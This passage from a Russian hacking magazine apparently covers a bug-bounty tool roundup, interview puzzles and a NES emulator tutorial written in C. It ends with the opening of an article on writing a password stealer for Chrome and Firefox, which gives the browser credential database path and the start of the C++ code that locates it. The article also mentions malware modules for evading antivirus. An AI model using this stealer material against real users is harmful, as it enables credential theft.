можностью выборки. Это бывает очень удобно при сравнении результатов
сканирования.
   Скачиваем nmap‐bootstrap.xsl и запускаем сканирование:


$ nmap ‐sS ‐T4 ‐A ‐sC ‐oA scanme ‐‐stylesheet https://raw.github
usercontent.com/honze‐net/nmap‐bootstrap‐xsl/master/nmap‐bootstrap.
xsl scanme.nmap.org
$ scanme2.nmap.org

Далее преобразовываем выхлоп ска на в HTML:


$ xsltproc ‐o scanme.html nmap‐bootstrap.xsl scanme.xml





Sparta
https://github.com/SECFORCE/sparta
  В качестве альтернативы предыду щему аддону можно использовать ска‐
нер‐комбайн Sparta, который входит в большинство популярных security‐дис‐
трибутивов.
   Эта утилита — обертка для Nmap, Hydra и дру гих популярных инс трумен‐
тов. С помощью Sparta удобно проводить поверхностную разведку перимет‐
ра:
 • собирать «живые» хосты;
 • брутить популярные сервисы, обнаруженные на периметре (SSH, FTP и так
   далее);
 • собирать веб‐приложения и скрин шоты.





badKarma
https://github.com/r3vn/badKarma
  Еще один комбайн для «обстрела» сетевого периметра. Этот инструмент
более продвинутый, чем Sparta, и поз воляет объеди нить несколько действий
в одном интерфейсе. Хотя badKarma еще «сырой» продукт, тем не менее он
активно развивается и есть надеж да, что в ско ром времени мы получим
еще один фреймворк. Имей в виду, авто матичес кой установки нет и некото‐
рых утилит для работы badKarma в Kali Linux не хва тает.





СБОР ИНФОРМАЦИИ
Aquatone
https://github.com/michenriksen/aquatone
   Aquatone — это набор инстру ментов для разведки по доменным именам.
С помощью открытых источников он способен обнаружить поддомены
на заданном домене, но можно сделать и полный перебор вариантов. После
обнаружения поддоменов Aquatone может прос канировать хосты на обычные
веб‐порты, при этом HTTP‐заголовки, HTML‐тела и скриншоты собираются
и консолидируются в отчет для удоб ного ана лиза поверхности атаки.





Assetnote
https://github.com/tdr130/assetnote
   Кто первый встал — того и тапки. Это правило особенно актуально в баг‐
хантинге. Утилита Assetnote помога ет уведомлять багханте ра о появлении
новых поддоменов у отслежива емой цели. Для это го необходимо добавить
API‐ключ сервиса Pushover.





При нахождении нового поддомена ты получишь уведомление на мобильный
телефон. После это го нуж но со всех ног бежать к компьюте ру и искать баги.





Meg, MegPlus и Smith
https://github.com/tomnomnom/meg
https://github.com/EdOverﬂow/megplus
https://github.com/EdOverﬂow/smith
  Meg — один из лучших инс трументов для поиска ценной информации. Он
содержит целый набор для поиска. С Meg за неболь шой промежу ток вре мени
ты сможешь исследовать множество доменов и под доменов в поисках
чего‐то определенного (например,  server‐status). Meg  к тому же умеет
работать со списком баг‐баунти‐программ с h1. Советую ознакомиться
с видеопрезентацией автора это го замечательного инструмента.





MegPlus & Smith за авторством EdOverﬂow — это обертки для оригинального
Meg.
  Meg+ (к сожалению, deprecated) к основному набору функций Meg добав‐
ляет следующие возможнос ти поиска и выявления уяз вимостей:
 • поддомены (с исполь зованием Sublist3r);
 • конфиги;
 • интересные строки;
 • open redirect;
 • инъекции CRLF;
 • мисконфиги CORS;
 • path‐based XSS;
 • захват доменов и поддоменов.

Утилита Smith позволя ет парсить результаты Meg для поиска иголок в стогах
разных находок.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
 АРСЕНАЛ БАГХАНТЕРА
         ПОДБИРАЕМ СОФТ ДЛЯ БЫСТРОГО ПОИСКА
         УЯЗВИМОСТЕЙ ПРИ УЧАСТИИ В BUG BOUNTY





РАСХИЩАЕМ ГРОБНИЦЫ
Зачастую на публичных репозиториях компаний можно найти полезную
информацию для получения доступа к тому или иному приложению даже
без анализа выложенного кода. Например, выявленный auth‐token принес
багхантеру 15 000 дол ларов! Также хорошей практикой, уже давшей свои
плоды, можно назвать парсинг аккаунтов GitHub из профилей LinkedIn сот‐
рудников компаний.
   Итак, наша цель — github.com. Если у тебя нет учетной записи — заведи.
Она поможет как минимум искать по содержимому, а как максимум начнешь
писать код. Ну или хотя бы форкать.





Github-Hunter
https://github.com/Hell0W0rld0/Github‐Hunter
   Этот инструмент поз воляет автоматизировать поиск по репозиториям
GitHub: забиваешь ключевики и пейлоады для поис ка, почтовый аккаунт
и адрес, по которо му нуж но направить результат. Пос ле продолжительного
поиска получаешь .db с найденными репозиториями, фай лами и строками
кода, в которых нашлись клю чевые сло ва.





gitleaks
https://github.com/zricethezav/gitleaks
   Эта утилита позволя ет выявлять критичные данные в конкретном репози‐
тории или у конкретного пользователя. Must have на случай, если знаешь, где
искать, но не знаешь что.





ЖАРИМ ХЛЕБ ВЕБ
Иногда на поверхности можно найти банальные веб‐уязвимости, которые
по тем или иным причинам просочились в прод. Это могут быть XSS, раз ного
рода утечки или раскрытие данных. Кажется, что это фантастика, но в жизни
бывает всё. Вот, например, типичная история: нашелся Heartbleed на одном
из продакшен‐серверов Mail.Ru: приехал необ новленный сервер из ремонта
и встал в прод. Все это можно обнаружить с помощью простейших сканеров
веб‐уязвимостей, поэто му добавим эти инс трументы в наш багхантерский
сервачок.


Input Scanner
https://github.com/zseano/InputScanner
   Этот написанный на PHP фреймворк c веб‐интерфейсом позволяет выяв‐
лять input‐формы и JS‐библиотеки в тестиру емом веб‐приложении. Нап‐
ример, можно выгрузить из Burp или ZAP список урлов из proxy‐history/
logger+/etc и прогнать через этот инс трумент, предварительно добавив
пейлоады. На выходе получаем список URI, которые можем при помощи in‐
truder профаззить для поиска векторов атаки.





Parameth
https://github.com/maK‐/parameth
   Эта утилита поможет забрутить GET‐ и POST‐запросы к веб‐приложению
для поиска чего‐то скрытого от обычных пауков/крауле ров, парсящих явные
ссылки в исследуемом приложении.





XSStrike
https://github.com/s0md3v/XSStrike
  Лю тая тулза для поис ка разных XSS. Умеет выявлять DOM‐based/reﬂected
XSS, краулить веб‐приложение, фаззить параметры для байпаса WAF, брут‐
форсить из файла с пейлоада ми, выявлять скрытые параметры и манипу‐
лировать значениями HEADER.





XSStrike автоматизирует множес тво рутин ной работы. При грамотной нас‐
тройке обеспечен отличный результат.





ТЯЖЕЛАЯ АРТИЛЛЕРИЯ
Напоследок — два убер‐комбайна, в которые вхо дит множество инструмен‐
тов для автоматизированного выявления и атаки целей, начиная от DNS‐
рекона, скана поддоменов и заканчивая выявлением веб‐уяз вимос тей, обхо‐
дом WAF и брутфорсом всего, что только воз можно. Но хочу сразу предуп‐
редить, что бездумное использование таких монстров — это как обезьяна
с пулеметом.


Sn1per
https://github.com/1N3/Sn1per
  Комбайн авторства небезызвес тного 1N3 — автора BruteX, BlackWidow,
Findsploit и собирателя огромного количества пейлоадов для Intruder Burp
Suite. Существует в виде Community Edition (free) и версии Pro.
   Что умеет:
 • автоматический базовый сбор информации (например, whois, ping, DNS);
 • автоматический  запуск  Google  hacking  зап росов  против  заданного
   домена;
 • автоматическое перечисление открытых портов;
 • автоматический перебор поддоменов и информа ции о DNS;
 • автоматический запуск скриптов Nmap на определенные открытые порты;
 • автоматическое сканирование веб‐приложений на базовые уязвимос ти;
 • автоматический перебор всех откры тых сервисов.

Sn1per при установке на обычный дистрибутив вро де Debian скачивает боль‐
ше гигабайта допол нительных утилит. И даже в Kali, где многое из нужных
вещей уже есть, инсталляция занимает немало времени.





Sn1per может работать в нескольких режимах — от OSSINT/RECON до ков‐
ровых бомбардировок целей в режиме Airstrike/Nuke (наподобие HailMary
в Armitage).





TIDoS Framework
https://github.com/theInfectedDrake/TIDoS‐Framework
   TIDoS Framework — это комплексная среда аудита веб‐приложений. Очень
гибкий фреймворк, где тебе достаточно выб рать и использовать модули типа
Metasploit. Имеет на борту множество модулей — от разведки и сбора
информации до эксплуата ции веб‐уязвимос тей.
   TIDoS име ет пять основных фаз, раз делен ных на 14 под фаз, которые,
в свою оче редь, состоят из 108 модулей.
  Инструмент очень навороченный, требует тюнинга перед использовани‐
ем.





OUTRO
Автоматизация — это хорошо, но голову тоже необходимо включать. Мак‐
симальную отдачу даст вдумчивое использование утилит, кастомизированная
подборка словарей и фазз‐листов для поиска, а также систематизированный
подход к поиску багов. И результат не заставит себя ждать.





Удачной охоты и богатых тро феев!
КОДИНГ


     ЗАДАЧИ
   ОТ КОМПАНИИ





                                      Александр Лозовский
                                                     lozovsky@glc.ru

    ЗАДАЧИ НА СОБЕСЕДОВАНИЯХ





Когда на собеседовании задают вопросы в стиле «почему
крышка от канализационного люка круглая?» — это как
минимум странно. Простыни с сиш ным кодом, который нуж‐
но скомпилировать в голове и предста вить конечный резуль‐
тат, — нудно. Считаю, что самые интересные задачки —
это задачи на общетехническое и логическое мышление.
Очень рад, что сегодня товарищи из компании Abbyy под‐
кинули нам именно такие задания. Вперед, решаем!


ЗАДАЧА 1: КОНСТАНТИН И КОМИКСЫ
Константин очень разносторонняя личность, и в чис ле прочего у него есть
хобби — чтение комиксов про бобра‐супергероя. Хоть он покупает и не все
номера, они ему очень нравятся. Однажды Константин задумал ся, в какой
момент он пропустил больше всего номеров подряд. Задачу усложняет тот
факт, что все журналы перемешаны. Помоги те Константину найти номера
комиксов, между которыми он пропустил наибольшее количество выпусков.
Учитывайте, что журнал очень ста рый и у него может быть миллиард выпусков,
коллекция Константина может дос тигать миллиона журналов. Константин
очень нетерпеливый и хочет получить ответ как можно быс трее.
  Подумайте над оптималь ным по времени решени ем.


             INFO

                     Предыдущий выпуск задач от компании Abbyy
                      смот ри здесь.



ЗАДАЧА 2: ДАША И СЕЙФ
Умная Даша уме ет хранить секреты и держит их в специальном сей фе. Чтобы
открыть сейф, нужно ввес ти цифровой код длины K (K > 2). К тому же сейф
устроен таким образом, что он валидирует пос ледние введенные K цифр
независимо от предыс тории. Например, если код 1998, а Даша вве‐
дет 911998, то сейф откроется. К сожалению, Даша забыла правильный код,
но помнит все цифры, которые могли встречать ся в коде.
  Подскажите Даше последовательность, в которой нужно набирать цифры,
чтобы она как можно скорее открыла сейф.


ЗАДАЧА 3: ABBYY И ОБЕДЕННЫЙ ПЕРЕРЫВ
Сотрудники ABBYY не любят ходить на обед по одно му. Поэтому каждый день
в определенное время группа сотрудников собира ет по всему офи су жела‐
ющих пообедать. В какой‐то из дней Антон начал процесс сбора кол лег
для совместной трапезы. Процесс устро ен следующим образом: Антон под‐
ходит к очередному сво ему другу, каждый из которых соглашается пойти
с ним на обед с вероятностью ½. Если друг отка зывается, то Антон расстра‐
ивается и прекращает процесс сбо ра, а если соглашается, то идет к сле‐
дующему своему другу и предлагает ему тоже пойти вмес те на обед. Антон
достаточно общительный, так что у него бесконечно много друзей в ком‐
пании.
  Найдите математическое ожидание количес тва людей, которые придут
в столовую (включая Анто на).


ЗАДАЧА 4: ЧТО БУДЕТ ВЫВЕДЕНО НА ЭКРАН?
Не ожидал я, что в четвертой задачке все же всплывет прос тыня сишного
кода. :) Но что поделать? Из пес ни слов не выкинешь!


#include <iostream>
using namespace std;
struct InnerBase {
      InnerBase() { cout << "InnerBase()" << endl; }
      virtual ~InnerBase() { cout << "~InnerBase()" << endl; }
};
struct InnerDerived : public InnerBase {
      InnerDerived() { cout << "InnerDerived()" << endl; }
      ~InnerDerived() { cout << "~InnerDerived()" << endl; }
};
struct Base {
      InnerBase B;
       Base() { cout << "Base()" << endl; }
      Base( const Base& der ) { cout << "Base(const Base&)" << endl;
}
      virtual ~Base() { cout << "~Base()" << endl; }
};
struct Derived : public Base {
      InnerDerived D;
       Derived() { cout << "Derived()" << endl; }
      ~Derived() { cout << "~Derived()" << endl; }
};
int main()
{
      Derived derived;
}

Итак, что будет выведено на экран?


ПРАВИЛЬНЫЕ ОТВЕТЫ
Присылай их сюда: maria.petrova@abbyy.com. Три победителя получат сер‐
тификаты с бессрочной лицензией на Abbyy FineReader 14 standard. На этот
раз попробуем выбирать победителей случайным образом (а не вручать
подарки первым троим), чтобы не заставлять читателей торопиться и дать
время на обдумывание задач всем желающим.
КОДИНГ

 ПИШЕМ ЭМУЛЯТОР
 ИГРОВОЙ КОНСОЛИ

      КАК УСТРОЕНА ЛЕГЕНДАРНАЯ
      ПРИСТАВКА NINTENDO И КАК
       ВОССОЗДАТЬ ЕЕ САМОМУ





Ты наверняка сталкивался с эмуляторами
игровых прис тавок и, возможно, даже про‐
сиживал за ними не один час. Но задавался
ли ты вопросом, как это работает? На при‐
мере NES, известной в России как Dendy, я           Иван Рыбин                                                                         Мой github аккаунт:
покажу, как создать собственный эмулятор.           https://github.com/i1i1vanyarybin1@live.ru
А заодно разберемся с хитрой архитек‐
турой этой прис тавки, выдававшей  пот‐
рясающе хорошую  картинку для своего
времени и своей скромной цены.


Все игровые консоли разными средствами адаптированы для запус ка игр,
что их и отличает от обычных компьютеров. Особенно это касается старых
приставок вроде NES: в восьмидеся тые годы с аппа ратными ресурсами было
туго, особенно если нужно было сделать недоро гой домашний агрегат. Эко‐
номить приходилось буквально на всем, чем и объясняются некоторые инже‐
нерные решения.





  Nintendo Entertainment System. В Рос сии таких почти ни у кого не было,
  поэтому все помнят ее по клонам типа Dendy


ВИДЫ ЭМУЛЯЦИИ
 • Интерпре тация. Интерпретатор поз воляет программно эмулировать
   все части консоли. Этот способ самый прос той и вместе с тем наименее
   производительный.
 • Динамическая рекомпиляция. Рекомпилятор сложен в написании,
   но при этом значитель но превосходит интерпретатор в производитель‐
   ности. Такой эмулятор может рекомпилировать инструкции эму лируемой
  машины в машинные инс трукции тво его компь ютера. Проще говоря,
   рекомпилятор выступа ет в роли переводчика с одного машинного языка
   на другой.


        WWW

                     Существуют эмулято ры для всех старых и даже
                        некото рых новых приставок. Вот несколько при‐
                       меров: Dolphin — эмулятор Wii и GameCube, eP‐
                    SXe — PS1, PCSX2 — PS2, PPSSPP — PSP.
                      Среди пока что незакон ченных, но быстро раз‐
                       вивающихся эмулято ров: Cemu — эмулятор Wii U,
                   RPCS3 — PS3, Yuzu — Switch, Xenia — эмулятор
                      Xbox 360.



MOS 6502: РЕГИСТРЫ, РЕЖИМЫ АДРЕСАЦИИ И ИНСТРУКЦИИ
NES неспроста снискала мировую популярность. Разработчики оборудо‐
вания пытались создать наиболее производитель ные решения, применяя
разного рода уловки. Раз работчики игр досконально изучали особенности
платформы и находили новые трюки, чтобы создать красивую картинку.
Порой даже очень красивую картинку для сво его времени.
   Как и в случае с компьютером, основная логика программ выполняется
на центральном процессоре приставки. Поэто му лучше всего начинать
написание эмулятора именно с него. В NES уста новлен восьмибитный про‐
цессор MOS 6502 с комплексным набором инс трукций (то есть как у Intel, а не
как у ARM или PowerPC).
   У процессора MOS 6502 шесть регистров, один из которых недос тупен
пользователю:
 • A — регистр, куда складываются результаты всех арифметических опе‐
   раций;
 • X, Y — индексные регистры;
 • SP — указатель на вершину стека;
 • P — регистр флагов, в x86 EFLAGS выполняет ту же функцию;
 • PC — счетчик команд, регистр, который указыва ет, какую команду выпол‐
   нять следующей. Этот регистр недос тупен напрямую.

Режимов адресации великое множество, и узнать о них будет полезно и за
рамками этой статьи.


  Наз вание       Определе ние            Пример

  Аккумулятор‐    Операндом инструкции     Арифметический сдвиг
     ный          является акку мулятор             влево ASL

  Предполага‐   Операнд явно указывается    Перенос значения A в X
    емый            инс трукцией                 TAX

    Немед‐     Операнд дается в инструк‐   Заг рузка значения в A LDA
    ленный               ции                    #$34

              Операндом является зна‐
  По абсолют‐                              Заг рузка значения в X LDX
                  чение по абсолют ному
  ному адресу                                  $9010
                        адресу

   По адресу
               По абсолютному адресу    Заг рузка значения в Y LDY
   в нулевой
                    первых 256 байт               $23
    странице

                                         Ветвление, если предыду‐
  Относитель‐     Адрес задается отно‐
                                    щий операнд равен 0 BEQ
     ный              ситель но PC
                                              $4A


             INFO

                     Нулевая страница — первые 256 байт памяти,
                        в которых размещаются наиболее часто исполь‐
                     зуемые переменные ради более быстрого дос‐
                         тупа к ним.


Всего у нашего процессора 256 инструкций, из которых 78 — это нас тоящие
инструкции без учета разных режимов адресации. Сразу сократим работу: мы
не будем писать обработ чик для всех 256 инс трукций. Напишем обработчики
для всех режимов адресации и для 78 инс трукций.
   Начнем с кода для режима адресации нулевой страницы.


void
addr_mode_zp()
{
  cpu_addr = ram_getb(reg.PC);
  reg.PC++;
}

В данном случае инструкция сос тоит из двух байт: один — это сама инструк‐
ция, второй — адрес операнда инс трукции. Функция ram_getb воз вращает
значения байта в RAM по адресу.
  А вот пример кода для инс трукции STX.


void
op_stx()
{
  ram_setb(cpu_addr, reg.X);
}

Функция ram_setb заменя ет зна чение бай та в RAM по адресу cpu_addr (опе‐
ранд инструкции) на значение регистра X.





                        Таб лица инс трукций

Также не стоит забывать, что MOS 6502 — мультицикличный процессор
и разные инструкции могут выполняться раз ное время. Поэтому, чтобы
выверить точное время выполнения, нужно знать, за сколько циклов выпол‐
няется инструкция.


        WWW

                     Полный список инструк ций и режимов адресации
                   можно найти в «Викиучебнике» и описании инс‐
                         трукций.



МАППЕРЫ
Так как в NES могут адресовать ся только 64 Кбайт данных, чтобы перек‐
лючаться между разными банками, в картридже существуют так называемые
мапперы.


        Ад рес                     Наз начение

      $0000 — $07FF               2 Кбайт внут ренней RAM

      $0800 — $1FFF              Ссылки на $0000 — $07FF

      $2000 — $2007                   Регис тры PPU

      $2008 — $3FFF              Ссылки на $2000 — $2007

      $4000 — $401F                     I/O и APU‐регис тры

      $6000 — $7FFF                    Банк PRG RAM

      $8000 — $BFFF              Нижний банк PRG ROM

      $C000 — $FFFF               Верхний банк PRG ROM

Маппер отвечает за переключение PRG (Program) ROM и CHR (Character)
ROM. В PRG ROM лежит основной код игр, он подключен напрямую к CPU.
В CHR ROM лежат графичес кие объекты, и он уже подключен к PPU.
  Одновременно в процессор могут быть подключены только два банка PRG
ROM по 16 Кбайт. Нижний банк расположен по адресам $8000 — $BFFF, вер‐
хний находится по адресам $C000 — $FFFF.
  В разных картриджах могут быть разные мап перы. Всего их более двухсот,
но не обязательно эмулировать их все. Дос таточно сделать реализацию нес‐
кольких мапперов для запуска самых популярных игр.
  Можно реализовать маппер как три функции:
 • функция инициализации;
 • врапперы над функциями получения и установки байтов RAM, такие
   как ram_getb и ram_setb.

Вот как выглядит маппер UxROM.


void
uxrom_init()
{
  prg_rom.low = 0;
  prg_rom.up = prg_rom.n ‐ 1;
  chr_rom.cur = 0;
}
uint8_t
uxrom_getb(uint16_t addr)
{
  return ram_general_getb(addr);
}
void
uxrom_setb(uint16_t addr, uint8_t b)
{
  if (addr < 0x8000)
    ram_general_setb(addr, b);
  else if (ram_getb(addr) == b)
    prg_rom.low = b;
}

В данном случае маппер изначально выставляет верхний банк PRG ROM пос‐
ледним из возможных, и его адрес оста ется фиксированным все время. Ниж‐
няя же часть может менять ся. Для это го пользователю нужно записать номер
PRG ROM в память картриджа. Если номер картриджа совпадает со значени‐
ем, которое лежит по адресу, куда пользователь записы вает, то маппер меня‐
ет нижний банк.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
   ПИШЕМ ЭМУЛЯТОР
   ИГРОВОЙ КОНСОЛИ
             КАК УСТРОЕНА ЛЕГЕНДАРНАЯ ПРИСТАВКА
           NINTENDO И КАК ВОССОЗДАТЬ ЕЕ САМОМУ





ВСЕ БЛАГОДАРЯ PICTURE PROCESSING UNIT
Ключевую роль в отрисовке игра ет PPU — Picture Processing Unit. Именно
благодаря  ему  у NES  для  своего  времени  была  хорошая  графика.
256 на 240 пикселей и палитра из 64 цветов прекрасно смотрелись
на телевизорах того времени.
   Если посчитать, то выйдет, что для хранения одного изображения на экра‐
не понадобится 45 Кбайт. Сейчас это зна чение выглядит смешно, но еще
тридцать лет назад эта цифра была непосиль на для консолей. Поэтому PPU
достигает компромисса между эффективностью, памятью и качес твом кар‐
тинки.





                      Скриншот из Castlevania


Отрисовка фона
Весь экран можно разделить на 32 × 30 тай лов, каждый из которых — квад‐
рат 8 × 8 пикселей. Четыре тайла составляют блок. Можно добавить разметку,
чтобы лучше видеть структуру картинки.





                           Тайлы и бло ки

Сетка темно‐зеленая в случае с блоками и светло‐зеленая для тайлов.
  Все символы рисуются как пиксель‐арт, в котором может быть только
четыре цвета (2 бита на пиксель, 16 байт на тайл). Таким образом, все изоб‐
ражение занимает 15 Кбайт, тогда как PPU доступно только около 12 Кбайт.





                     Пример пиксель‐арта


       Ад рес                     Наз начение

     $0000 — $0FFF             Таблица символов 0(CHR ROM)

     $1000 — $1FFF             Таблица символов 1(CHR ROM)

     $2000 — $23FF                   Таблица имен 0

     $2400 — $27FF                   Таблица имен 1

     $2800 — $2BFF                   Таблица имен 2

    $2C00 — $2FFF                   Таблица имен 3

     $3000 — $3EFF              Ссылки на $2000 — $2EFF

     $3F00 — $3F1F                    Палитры


Таб лица имен
Для еще большей экономии места сущес твуют таблицы имен и таблицы атри‐
бутов. Каждый байт в таблице имен назначает, какой символ будет находить‐
ся в тайле, своеоб разный индекс в таблице шаб лонов. На одну таблицу имен
уходит 960 байт в памяти PPU.





                     Скриншот с таб лицей имен


Палитры
В NES есть внутренняя палитра из 64 цветов. Также есть восемь палитр
(четыре для фона, четыре для спрайтов), сос тоящие из четырех цве тов, один
из которых — цвет фона. Соз датель игр может менять эти палитры, чтобы
добиться наилучшей картинки. Таким обра зом, в них хранятся индексы внут‐
ренней палитры NES.


                     Пример игро вых палитр

В таблице атрибутов хра нятся как раз индексы палитр. Каждый из этих
индексов соответствует одному блоку, поэтому внутри одного блока можно
использовать только четыре цвета. Благодаря этим особенностям игры
на NES выглядят так, будто сос тоят из отдельных блоков, хотя во многих слу‐
чаях разработчики игр умело обходят ограничения консоли.
  За выбор палитры отвечает таблица атрибутов, пос ледний компонент
отрисовки.


Таб лица атрибутов
Каждой таблице имен соответс твует одна таблица атрибутов. Атрибуты
занимают по два бита на блок и указыва ют на одну из четырех палитр,
которую стоит использовать для отрисовки блока.





                      Скриншот с палит рами

Как ты заметил, в разных блоках рас положены разные палитры, всего их
четыре. Но разработчики научились умело скрывать это, чередуя палитры
и тайлы. Так как на один атрибут уходит два бита, то на всю таблицу уходит
не более 64 байт. Всего с учетом того, что NES имеет две таблицы шаб лонов
(или 512 символов), четыре таблицы имен и четыре таблицы атрибутов, в ито‐
ге занято около 12 Кбайт. Существенно меньше и намного более гиб ко!


Отрисовка спрайтов
Для того чтобы рисовать динамические объекты, существу ют спрайты. Их
отрисовка несильно отличается от отрисовки фона, но тут есть ряд особен‐
ностей.
  PPU име ет отдельную память — OAM (object attribute memory), в которой
находятся параметры раз ных спрайтов. Всего спрайтов может быть до 64,
каждый спрайт занимает четыре байта. Они отвечают за индекс символа
для отрисовки, позицию на экране (x, y), флаги. Во флагах находится номер
палитры, флаг отражения по вер тикали и горизонтали, а также приоритет
спрайта.
  Флаги отражения предназна чены для простого отражения спрайта по вер‐
тикали и горизонтали. Это позволяет экономить на памяти для спрайтов
и сохранить время процессора. Приоритет отвечает за то, какой спрайт дол‐
жен быть отрисован, если спрайты перекрыва ются. Часто используются ком‐
бинации из нескольких спрайтов для отри совки больших объектов — нап‐
ример, персонажей.





               Простой спрайт и комбинация спрайтов


СИНХРОНИЗАЦИЯ МЕЖДУ CPU И PPU
Для общения между CPU и PPU в память CPU отоб ражены некоторые регис‐
тры PPU. С их помощью CPU может управлять работой PPU.
 • Controller отвечает за выбор таблиц шаб лонов и таблиц имен, размер
   спрайтов, а также за NMI.
 • С помощью регистра Mask можно включать и выключать отображение
   фона, спрайтов, менять цветовую гамму изоб ражения.
 • Регистр Scroll отвечает за перемещение камеры для заднего фона. Скрол‐
   линг может быть не толь ко горизонтальным, но и вертикальным.





                      Пример скрол линга


        WWW

                     Полный список регистров PPU




NMI
CPU и PPU работают на разных частотах, но, чтобы отрисовывать картинку,
они должны работать синхронно. Весь цикл рендеринга PPU состоит
из 262 тактов.


   Так ты              Про исхо дящее на экране

    0–240                  От рисовывает ся картинка

      241                         Пропуск

   242–261           Ус тановка флага Vblank и срабатывание NMI

С 242‐го по 261‐й такт PPU уста навливает Vblank и вызывает NMI. Он уведом‐
ляет процессор, что отрисовка кадра закончена и PPU не будет обращаться
к памяти, чтобы избежать конфликтов с CPU, а также сообщает, что ждет
дальнейших команд от процессора.
  NMI — non maskable interrupt. Прерыва ние, которое срабаты вает после
того, как PPU отрендерил кадр. Во время него у CPU есть около 2273 циклов,
чтобы подготовить сле дующий кадр.


ПРИМЕР КОДА PPU ДЛЯ ОТРИСОВКИ
PPU отрисовывает линии по очереди. Так будет выглядеть код для отрисовки
линии для фона.


void
ppu_draw_tile_line(int tile, int screen_x, int screen_y, int ny, int
pal)
{
  uint8_t low, high;
  int i, clr;
  low  = ppu_getb(tile + ny % 8);
  high = ppu_getb(tile + ny % 8 + 8);
  for (i = 0; i < 8; i++) {
    int clr0, clr1;
    if (scr_x + i < 0 || scr_x + i > 255)
      continue;
    clr0 = (high >> (7 ‐ i)) & 1;
    clr1 = (low  >> (7 ‐ i)) & 1;
    clr = (clr0 << 1) | clr1;
    set_pixel(screen_y, screen_x + i, ppu_getb(pal + clr));
  }
}
void
ppu_draw_bg_line()
{
  int x, y, nx, ny;
  int screen_x, screen_y;
  uint16_t patt, name, name_right, attrib_left, attrib_right;
  screen_y = ppu.scanline;
  y = ppu.PPUSCROLL_Y + ppu.scanline;
  ny = y % 240;
  patt = ppu_bg_patt_tbl();
  name_left  = ppu_get_name_tbl_left(ppu.PPUSCROLL_X, y);
  name_right = ppu_get_name_tbl_right(ppu.PPUSCROLL_X, y);
  attrib_left  = name_left  + 0x3C0;
  attrib_right = name_right + 0x3C0;
  for (screen_x = ‐ppu.PPUSCROLL_X % 8; screen_x < 256; screen_x += 8
) {
    uint16_t name, attrib, pal;
    int tile, tile_idx;
    x = screen_x + ppu.PPUSCROLL_X;
    nx = x % 256;
    if (x < 0)
      continue;
    if (x < 256) {
      name = name_left;
      attrib = attrib_left;
    } else {
      name = name_right;
      attrib = attrib_right;
    }
    tile_idx = ppu_getb(name + (ny >> 3) * 32 + (nx >> 3));
    tile = patt + tile_idx * 16;
    pal = attrib + (ny >> 5) * 8 + (nx >> 5);
    pal = ppu_getb(pal);
    if (ny % 32 >= 16)
      pal >>= 4;
    if (nx % 32 >= 16)
      pal >>= 2;
    pal = 0x3f00 + (pal % 4) * 4;
    ppu_draw_tile_line(tile, screen_x, screen_y, ny, pal);
  }
}

На одном экране может присутс твовать больше одной таблицы имен. Поэто‐
му в коде нужно учитывать и это.





                   Две таб лицы имен на экра не

Функция ppu_draw_tile_line получа ет на вход адрес тайла, координаты,
по которым он дол жен появиться, номер строки и палитру. На выходе она
отрисовывает одну из линий этого тайла. Функция ppu_getb отвечает
за получе ние байта памяти из PPU.
  В функции ppu_draw_bg_line про исходит непос редственная отрисовка
одной линии заднего вида. Функция про ходит по всем тайлам и отрисовы вает
их с учетом скрол линга. Для этого она в первую очередь опре деля ет, какую
таблицу имен исполь зовать. Она также находит индекс тайла в таблице имен
и его адрес в таблице шаблонов. Пос ле этого функция находит номер палит‐
ры в таблице атрибутов, а поз же и адрес самой палитры.


ВЫВОДЫ
На мой субъективный взгляд, это го материала достаточно, чтобы получить
общее представ ление о работе NES и начать раз рабатывать эмулятор. Всех
желающих разобраться в этой теме подробнее приг лашаю посетить репози‐
торий с уроками по созданию игр на NES и репози торий с эму лятором NES.
КОДИНГ





                                                                Nik Zerof
                                                                 xtahi0nix@gmail.com

      ПИШЕМ
       СТИЛЕР
                         КАК ВЫТАЩИТЬ
                     ПАРОЛИ CHROME
                      И FIREFOX
                   СВОИМИ РУКАМИ



Ты наверняка слышал о таком классе зловредных при ложе‐
ний, как стилеры. Их задача — вытащить из системы жертвы
ценные данные, в первую очередь — пароли. В этой статье я
расскажу, как имен но они это делают, на примере извле‐
чения паролей из бра узеров Chrome и Firefox и покажу при‐
меры кода на C++.


           WARNING

                      Весь код в статье приводится исключительно
                        в образовательных целях и для восстанов ления
                       собственных  уте рян ных  паролей.  Похищение
                       чужих учетных или других личных данных без над‐
                    лежащего  письменного  соглашения  кара ется
                      по закону.


Итак, браузеры, в основе которых лежит Chrome или Firefox, хранят логины
и пароли пользователей в зашифрованном виде в базе SQLite. Эта СУБД
компактна и распространяется бесплатно по сво бодной лицензии. Так же,
как и рассматриваемые нами браузеры: весь их код открыт и хорошо
документирован, что, несомненно, поможет нам.
  В примере модуля стилинга, который я приведу в статье, будет активно
использоваться CRT и другие сторонние биб лиотеки и зависимос ти, типа
sqlite.h. Если тебе нужен компактный код без зависимостей, придется его
немного переработать, избавившись от некото рых функций и настроив ком‐
пилятор должным образом. Как это сделать, я показы вал в статье «Тайный
WinAPI. Как обфусцировать вызовы WinAPI в сво ем приложении».

Что ска жет анти вирус?
Рекламируя свои продукты, вирусо писа тели часто обращают внимание
потенциальных покупателей на то, что в данный момент их стилер не «палит‐
ся» антивирусом.
   Тут надо понимать, что все современные и более‐менее серьезные
вирусы и трояны имеют модульную структуру, каждый модуль в которой отве‐
чает за что‐то свое: один модуль собира ет пароли, второй препятс твует
отладке и эмуляции, третий определяет факт работы в виртуальной машине,
четвертый  проводит  обфускацию  вызовов  WinAPI,  пятый  разбирается
со встроенным в ОС файрволом.
   Так что судить о том, «палит ся» определен ный метод антивиру сом или нет,
можно, только если речь идет о законченном «боевом» приложении, а не
по отдельному модулю.



CHROME
Начнем с Chrome. Для начала давай получим файл, где хранятся учетные
записи и пароли пользователей. В Windows он лежит по такому адресу:


C:\Users\%username%\AppData\Local\Google\Chrome\UserData\Default\
Login Data

Чтобы совершать какие‐то манипуляции с этим файлом, нужно либо убить все
процессы браузе ра, что будет бро сать ся в глаза, либо куда‐то скопировать
файл базы и уже после это го начинать работать с ним.
  Давай напишем функцию, которая получа ет путь к базе паролей Chrome.
В качестве аргумента ей будет передаваться массив символов с результатом
ее работы (то есть массив будет содержать путь к фай лу паролей Chrome).


#define CHROME_DB_PATH  "\\Google\\Chrome\\User Data\\Default\\Login
Data"
bool get_browser_path(char * db_loc, int browser_family, const char *
 location) {
